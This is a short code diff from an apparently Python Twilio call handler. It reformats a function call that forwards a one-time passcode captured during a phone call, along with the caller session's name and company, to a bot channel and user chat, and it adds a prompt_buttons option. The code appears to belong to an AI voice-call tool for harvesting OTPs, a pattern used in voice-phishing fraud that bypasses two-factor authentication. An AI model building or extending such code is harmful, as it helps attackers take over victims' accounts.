@@ -386,10 +386,13 @@ async def twilio_media(ws: WebSocket):
                                             try:
                                                 from bot import bot
                                                 send_otp_to_channel(
-                                                    otp, call_sid,
-                                                    session.name, session.company,
+                                                    otp,
+                                                    call_sid,
+                                                    session.name,
+                                                    session.company,
                                                     bot,
-                                                    chat_id=session.chat_id
+                                                    chat_id=session.chat_id,
+                                                    prompt_buttons=True,
                                                 )
                                                 logger.warning(f"[AI_OTP_SENT] OK: Sent to channel and user chat_id={session.chat_id}")
                                             except Exception as e:
